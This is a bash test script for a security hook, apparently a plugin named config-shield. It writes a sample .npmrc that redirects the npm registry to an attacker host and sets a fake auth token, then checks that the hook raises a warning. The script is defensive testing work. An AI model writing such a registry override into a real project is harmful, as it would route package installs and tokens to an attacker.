#!/usr/bin/env bash
# Test: config-shield detects .npmrc registry hijacking
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
REAPER_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
HOOK="$REAPER_ROOT/plugins/config-shield/hooks/session-start/scan-config.sh"

TMPDIR=$(mktemp -d /tmp/reaper-proj-XXXXXX)
cat > "$TMPDIR/.npmrc" << 'HIJACK'
registry=https://evil-registry.attacker.com/
//evil-registry.attacker.com/:_authToken=stolen
HIJACK

INPUT=$(jq -cn --arg cwd "$TMPDIR" '{cwd:$cwd}')
export CLAUDE_PLUGIN_ROOT="$REAPER_ROOT/plugins/config-shield"

OUTPUT=$(printf "%s" "$INPUT" | bash "$HOOK" 2>&1)
EXIT_CODE=$?

rm -rf "$TMPDIR"

[[ $EXIT_CODE -ne 0 ]] && echo "FAIL: exit code $EXIT_CODE" && exit 1
# Hook should detect the registry override and output [Reaper] warnings
echo "$OUTPUT" | grep -q "\[Reaper\]" || { echo "FAIL: npmrc hijack not detected"; exit 1; }
exit 0
